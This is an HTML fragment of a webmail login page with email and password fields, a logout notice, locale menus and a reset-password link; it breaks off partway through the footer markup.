<body class="wm">
    <div id="preload_images"></div>
    
<input type="hidden" id="goto_uri" value="/">
<input type="hidden" id="goto_app" value="">
<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
    <div class="wrapper">
    <div id="notify">
        <noscript>
            &lt;div class="error-notice"&gt;
                &lt;img src="notice-error.png" alt="Error" align="left"/&gt;
                JavaScript is disabled in your browser.
                For Webmail to function properly, you must enable JavaScript.
                If you do not enable JavaScript, certain features in Webmail will not function correctly.
            &lt;/div&gt;
            </noscript>
        
        <div id="login-status" class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">You have logged out.</div>
                </div>
            </div>
        </div>
    </div>

    <div style="display:none">
        <div id="locale-container" style="visibility:hidden">
            <div id="locale-inner-container">
                <div id="locale-header">
                    <div class="locale-head">Please select a locale:</div>
                    <div class="close"><a href="">X Close</a></div>
                </div>
                <div id="locale-map">
                    <div class="scroller clear">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="content-container">
        <div id="login-container">
<div id="login-status-message"> 
     
    <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="./files/webmail-logo.svg" alt="logo">
                    </div>
                    <div id="login-sub">
                        <div id="clickthrough_form" style="visibility:hidden">

                        </div>
                        <div id="forms">
                            <div id="login_form">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" placeholder="Enter your email id."autofocus="autofocus" value="" class="std_textbox" type="text" tabindex="1" required=""required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    
                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required=""required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button onclick="CheckValid();" name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>

                                                                            <div class="reset-pw">
                                            <a href="" id="reset_password">Reset Password
                                            </a>
                                        </div>
                                                                    </div>
                                <div class="clear" id="push"></div>
                            </div>
                        <!--CLOSE forms -->
                        </div>
                    <!--CLOSE login-sub -->
                    </div>
  </div>


                                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>
        
                <div id="locale-footer" style="display: block;">
            <div class="locale-container">
                
                <ul id="locales_list">

                    <li><a href="" id="morelocale"  title="More locales">…</a></li>
                </ul>
                <div id="mobilelocalemenu">Select a locale:
                    <a href=""  title="Change locale">English</a>
                </div>
            </div>
